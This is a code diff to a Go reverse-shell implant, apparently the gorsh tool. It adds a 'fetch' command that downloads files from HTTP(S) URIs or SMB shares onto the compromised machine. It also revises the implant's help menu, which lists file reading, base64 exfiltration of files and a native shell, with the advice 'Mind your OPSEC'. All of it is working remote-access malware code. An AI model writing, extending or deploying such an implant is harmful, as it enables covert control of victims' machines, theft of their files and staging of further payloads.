@@ -16,6 +16,7 @@ import (
 	"strings"
 
 	"code.cloudfoundry.org/bytefmt"
+	"github.com/audibleblink/gorsh/fetch"
 	"github.com/audibleblink/gorsh/shell"
 )
 
@@ -150,14 +151,29 @@ func InteractiveShell(conn net.Conn) {
 					Send(conn, base64)
 				}
 
+			case "fetch":
+				if len(argv) == 3 {
+					bytes, err := fetch.Get(argv[1], argv[2])
+
+					if err != nil {
+						Send(conn, err.Error())
+					} else {
+						msg := fmt.Sprintf("%d bytes copied to %s", bytes, argv[2])
+						Send(conn, msg)
+					}
+				} else {
+					Send(conn, "This action requires 2 arguments")
+				}
+
 			case "help":
 				Send(conn, "Currently implemented commands: \n"+
-					"cd <path>     -  Change the processe's working directory\n"+
-					"ls            -  List the current working directory\n"+
-					"pwd           -  Print the current working directory\n"+
-					"cat <file>    -  Print the contents of the given file\n"+
-					"base64 <file> -  Base64 encode the given file and print\n"+
-					"shell         -  Drops into a native shell. Mind your OPSEC\n"+
+					"cd [path]          -  Change the process' working directory\n"+
+					"ls [path]          -  List the current working directory\n"+
+					"pwd                -  Print the current working directory\n"+
+					"cat <file>         -  Print the contents of the given file\n"+
+					"base64 <file>      -  Base64 encode the given file and print\n"+
+					"fetch <URI> <file> -  Fetch stuff. http[s]:// or //share/folder (Windows only)\n"+
+					"shell              -  Drops into a native shell. Mind your OPSEC\n"+
 					"\n")
 			default:
 				Send(conn, "Command not implemented. Try 'help'")
